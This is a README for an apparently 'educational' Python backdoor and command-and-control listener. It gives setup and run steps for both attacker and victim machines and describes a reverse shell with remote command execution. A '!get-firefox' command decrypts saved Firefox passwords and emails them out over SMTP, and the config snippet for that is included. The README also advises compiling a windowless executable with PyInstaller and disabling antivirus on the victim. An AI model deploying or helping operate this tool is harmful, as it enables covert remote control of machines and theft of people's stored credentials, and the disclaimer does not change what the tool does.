
# 🔍 Backdoor & C2 Listener (Educational Project)

This project combines **two Python scripts** to demonstrate, for educational purposes, how a **Backdoor** and a basic **Command & Control (C2)** system work:

- `backdoor.py`: runs on the victim machine and establishes a connection to the attacker.  
- `c2_listener.py`: runs on the attacker machine and allows remote command execution.

The purpose of this project is to **teach and learn offensive and defensive security concepts**, helping security analysts and students understand how these techniques operate and develop **countermeasures**.

> ⚠️ Certain functionalities of `backdoor.py` are **focused on Windows systems**. It is recommended to run it on Windows for full compatibility.  

---

## 🖼️ Architecture

```text
+----------------+           +----------------+
| Victim Machine | --------> | Attacker C2    |
| (backdoor.py)  |           |(c2_listener.py)|
+----------------+           +----------------+
        |                           ^
        | Remote Command / Data     |
        |-------------------------->|
        |                           |
```



---

## 🚀 Features

- 📡 Reverse connection between client (victim) and server (attacker)  
- 💻 Remote command execution  
- 📂 Use the SMTP protocol to send information from accounts saved in Firefox  
- 🔐 Simple communication (no encryption, for educational purposes)  
- 🛠️ Easy-to-understand Python code, easy to modify  
- 💡 Special command `!get-firefox` in the C2 sends an email with saved Firefox account information (requires configuration, see below)  

---

## 📦 Installation

```bash
# Clone the repository
git clone https://github.com/RandyNin/c2-backdoor.git
cd c2-backdoor

# Install dependencies
pip install -r requirements.txt
pip install requests  # required for backdoor functionality
````

---

## ⚡ Usage

> **Note:** The scripts do not use command-line parameters.

### 1️⃣ On the attacker machine (listener):

```bash
python c2_listener.py
```

### 2️⃣ On the victim machine (backdoor):

```bash
python backdoor.py
```

> **Optional (Recommended for testing in controlled environments):**  
> Compile `backdoor.py` with PyInstaller to avoid Python dependency and required libraries:
> 
> ```bash
> pyinstaller --onefile --noconsole backdoor.py
> ```
> 
> This will create a standalone executable.

> **Educational Warning:** To ensure the backdoor runs on the victim machine, antivirus protection may need to be disabled. Use only in **controlled and authorized environments**.

---

## 💡 Firefox Account Export Function

The `!get-firefox` command in the C2 listener will send saved Firefox account information via email. To use this feature:

1. Modify the following lines in `c2_listener.py` with your own email configuration:
    

```python
self.send_email(
    "Decrypted Firefox Passwords",
    passwords,
    '<Your email Address>',
    ["<Destination addresses>"],
    "<Email app password>"
)
```

2. Create an **App Password** for your email (Gmail, Outlook, etc.) and use it in the `"<Email app password>"` field.
    
3. Ensure `requests` library is installed before compiling or running the `backdoor.py`.
    

---

## 📚 Requirements

- Python **3.10+**
    
- `requests` library (for Windows Firefox functionality)
- 
-  `termcolor` library (for terminal color display)
    

---

## ⚠️ Disclaimer

This software is provided **for educational purposes only**.  
It should only be used in **controlled and authorized environments**.  
The author is **not responsible for any misuse** of this tool.

